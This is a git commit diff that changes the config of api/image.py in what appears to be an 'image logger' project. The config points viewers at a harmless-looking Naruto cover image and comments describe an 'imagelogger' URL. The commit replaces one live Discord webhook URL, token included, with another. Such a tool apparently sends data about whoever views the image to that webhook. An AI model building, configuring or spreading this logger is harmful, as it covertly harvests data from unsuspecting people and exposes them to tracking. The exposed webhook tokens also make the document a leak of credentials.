f66095baff1123ac9606519665253c57d9e20aa6
2iqbox <ejenkins200909@gmail.com>
2025-06-26 16:21:27 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385133449853009920/j1EiE3ovJCKu_R-MuOZotNkV9nmAH2V04oOjmmPbjI5G3Ym8uvYn5Dk1yEM_iFlGuIyi",
+    "webhook": "https://discord.com/api/webhooks/1387935773168370005/gpdqJKWGovczhr_hnnPdEIeSOXfHw2tXPUObtgnDdQdT6uP7jzBX3nMv9-dXXghcWZtA",
     "image": "https://upload.wikimedia.org/wikipedia/en/9/94/NarutoCoverTankobon1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
